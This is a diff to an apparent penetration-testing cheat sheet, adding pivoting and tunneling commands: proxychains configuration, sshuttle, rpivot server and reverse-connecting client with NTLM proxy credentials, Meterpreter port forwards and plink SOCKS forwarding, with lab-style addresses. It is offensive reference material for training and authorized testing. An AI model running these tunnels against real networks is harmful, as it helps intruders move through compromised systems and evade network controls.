@@ -763,6 +763,14 @@ $ proxychains <command>
 $ sudo proxychains -q nmap -sT -Pn 172.16.119.13 --open
 ```
 
+- Proxychains Web Traffic
+
+```
+Edit /etc/proxychains4.conf
+Edit [ProxyList] e.g. socks4 127.0.0.1 9050 OR socks5 127.0.0.1 9050
+$ proxychains firefox-esr <IP address>:80
+```
+
 - Proxychains with Kerberos
 
 ```
@@ -781,16 +789,38 @@ $ sudo ./chisel server -p 8000 --reverse
 $ ./chisel client <IP address>:8000 R:631:127.0.0.1:631
 ```
 
+- Sshuttle
+
+```
+$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v
+```
+
 - Socat
 
 ```
 $ socat tcp-listen:9090,fork tcp:127.0.0.1:631 &
 ```
 
-- Meterpreter
+- Rpivot
 
 ```
-meterpreter> portfwd add -l 8082 -p 631 -r 127.0.0.1
+https://github.com/klsecservices/rpivot
+$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
+$ python client.py --server-ip <IP address> --server-port 8080 --ntlm-proxy-ip <Proxy IP address> --ntlm-proxy-port 8081 --domain <domain> --username <username> --password <password>
+```
+
+- Meterpreter Portfwd
+
+```
+meterpreter > portfwd add -l 3300 -p 3389 -r <IP address>
+meterpreter > portfwd add -R -l 8081 -p 1234 -L <IP address>
+```
+
+- Plink
+
+```
+C:\> plink -D 9050 ubuntu@<IPaddressofTarget>
 ```
 
 - PsExec
